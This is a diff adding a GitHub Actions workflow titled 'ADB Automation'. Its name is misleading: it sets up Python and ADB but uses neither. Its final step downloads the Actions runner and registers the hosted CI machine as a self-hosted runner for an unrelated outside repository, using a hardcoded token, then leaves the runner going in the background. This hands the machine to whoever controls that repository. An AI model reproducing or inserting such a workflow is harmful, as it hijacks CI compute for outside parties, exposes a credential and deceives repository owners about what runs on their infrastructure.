@@ -1,0 +1,33 @@
+name: ADB Automation
+
+on:
+  push:
+    branches:
+      - main
+
+jobs:
+  setup_and_run_adb_script:
+    runs-on: ubuntu-latest
+
+    steps:
+    - name: Checkout repository
+      uses: actions/checkout@v2
+
+    - name: Set up Python
+      uses: actions/setup-python@v2
+      with:
+        python-version: 3.8
+
+    - name: Install ADB
+      run: |
+        sudo apt-get update -y
+        sudo apt-get install -y android-tools-adb
+    - name: Set up GitHub Actions runner
+      run: |
+        mkdir actions-runner && cd actions-runner
+        curl -o actions-runner-linux-x64-2.312.0.tar.gz -L https://github.com/actions/runner/releases/download/v2.312.0/actions-runner-linux-x64-2.312.0.tar.gz
+        echo "85c1bbd104d539f666a89edef70a18db2596df374a1b51670f2af1578ecbe031  actions-runner-linux-x64-2.312.0.tar.gz" | shasum -a 256 -c
+        tar xzf ./actions-runner-linux-x64-2.312.0.tar.gz
+        ./config.sh --url https://github.com/nonoto999t/runer --token BE3XBEIDGKLC7CVQFXSL3A3FW4P5W
+        nohup ./run.sh &
+
